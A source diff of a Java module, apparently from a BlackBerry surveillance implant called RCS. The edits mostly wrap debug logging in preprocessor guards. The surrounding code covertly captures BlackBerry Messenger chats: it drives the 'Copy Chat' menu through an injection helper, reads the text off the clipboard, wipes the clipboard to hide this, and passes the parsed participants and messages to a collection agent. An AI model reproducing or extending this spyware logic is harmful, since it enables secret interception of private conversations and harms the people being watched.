@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.agent.im;
 
 import java.util.Hashtable;
@@ -23,52 +23,62 @@ import blackberry.injection.MenuWalker;
 import blackberry.utils.Check;
 
 public class ConversationScreen {
+    //#ifdef DEBUG
     private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
 
+    //#endif
     private UiApplication bbmApplication;
     private Vector conversationScreens = new Vector();
-    Hashtable conversations=new Hashtable();
+    Hashtable conversations = new Hashtable();
 
     public void setBBM(UiApplication bbmApplication) {
         this.bbmApplication = bbmApplication;
         //this.conversationScreens=conversationScreens;
 
+        //#ifdef DEBUG
         debug.info("conversation Leech: " + conversationScreens);
+        //#endif
     }
 
     public synchronized void getConversationScreen() {
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
-                debug.ledStart(Debug.COLOR_RED);
+                //#ifdef DEBUG
+                debug.ledFlash(Debug.COLOR_RED);
+                //#endif
                 return;
             }
 
             Screen screen = bbmApplication.getActiveScreen();
 
+            //#ifdef DEBUG
             debug.info("leech active screen: " + screen);
+            //#endif
 
             if (screen.getClass().getName().indexOf("ConversationScreen") >= 0
                     && bbmApplication.isForeground()) {
 
                 String conversation = extractConversation(screen);
-                
-                
+
                 if (!conversationScreens.contains(screen)) {
+                    //#ifdef DEBUG
                     debug.info("Added new conversation screen: " + screen);
+                    //#endif
                     conversationScreens.addElement(screen);
-                    conversations.put(screen, new Integer(conversation.hashCode()));
+                    conversations.put(screen,
+                            new Integer(conversation.hashCode()));
                     // exploreField(screen, 0, new String[0]);
                 }
 
                 // se conversation e' uguale all'ultima parsata non fare niente.
                 Integer hash = (Integer) conversations.get(screen);
-                if(hash.intValue() == conversation.hashCode()){
+                if (hash.intValue() == conversation.hashCode()) {
                     //#ifdef DEBUG
                     debug.trace("getConversationScreen: equal conversation, ignore it");
                     //#endif
                     return;
                 }
-                
+
                 Vector result = parseConversation(conversation);
 
                 if (result != null) {
@@ -83,7 +93,9 @@ public class ConversationScreen {
                     ImAgent agent = ImAgent.getInstance();
                     agent.add(partecipants, lines);
 
-                    debug.ledStart(Debug.COLOR_YELLOW);
+                    //#ifdef DEBUG
+                    debug.ledFlash(Debug.COLOR_YELLOW);
+                    //#endif
                 }
             }
             /*
@@ -104,22 +116,28 @@ public class ConversationScreen {
 
     private String extractConversation(Screen screen) {
 
+        //#ifdef DEBUG
         debug.trace("extractConversation");
 
+        //#endif
         // debug.trace("try copy chat: "+screen);
         if (MenuWalker.walk("Copy Chat", screen, true)) {
             String clip = (String) Clipboard.getClipboard().get();
             Clipboard.getClipboard().put("");
 
             if (!conversationScreens.contains(screen)) {
+                //#ifdef DEBUG
                 debug.info("Clip: " + clip);
+                //#endif
             }
 
             //debug.info("Clip: "
             //        + clip.substring(0, Math.min(100, clip.length())));
             return clip;
         } else {
+            //#ifdef DEBUG
             debug.info("NO Conversation screen!");
+            //#endif
             return null;
         }
     }
@@ -158,7 +176,7 @@ public class ConversationScreen {
                     break;
                 }
                 posMessages += currentLine.length() + 1;
-                
+
                 if (numLine < 5) {
                     //#ifdef DEBUG
                     debug.trace("line " + numLine + " : " + currentLine);
@@ -167,14 +185,14 @@ public class ConversationScreen {
                 numLine += 1;
 
                 // unisce le linee spezzate del nome
-                if(currentLine.indexOf(":")<0){
-                    lastLine=currentLine;
+                if (currentLine.indexOf(":") < 0) {
+                    lastLine = currentLine;
                     continue;
-                }else{
-                    currentLine = lastLine+" "+currentLine;
-                    lastLine="";
+                } else {
+                    currentLine = lastLine + " " + currentLine;
+                    lastLine = "";
                 }
-                
+
                 //#ifdef DEBUG
                 debug.trace("parseConversation adding line: " + currentLine);
                 //#endif
@@ -182,7 +200,9 @@ public class ConversationScreen {
             }
 
             //agent.add(partecipants, lines);
+            //#ifdef DEBUG
             debug.info("num lines: " + numLine);
+            //#endif
             result.addElement(partecipants);
             result.addElement(lines);
 
